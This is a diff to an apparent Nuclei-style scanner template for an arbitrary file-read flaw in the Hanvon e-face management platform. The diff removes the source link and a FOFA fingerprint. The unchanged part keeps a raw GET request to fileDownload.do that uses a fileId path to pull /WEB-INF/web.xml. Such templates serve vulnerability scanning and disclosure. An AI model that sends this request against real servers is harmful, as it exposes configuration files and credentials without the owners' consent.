@@ -3,12 +3,8 @@ info:
   name: 汉王e脸通综合管理平台 fileDownload.do 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xria86ku5w1twho5'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xria86ku5w1twho5
-    fofa: icon_hash="1380907357"
 http:
 - raw:
   - 'GET /manage/personnel/fileDownload.do?fileId=/WEB-INF/web.xml&recoToken=ZuZBOrvLG8M HTTP/1.1
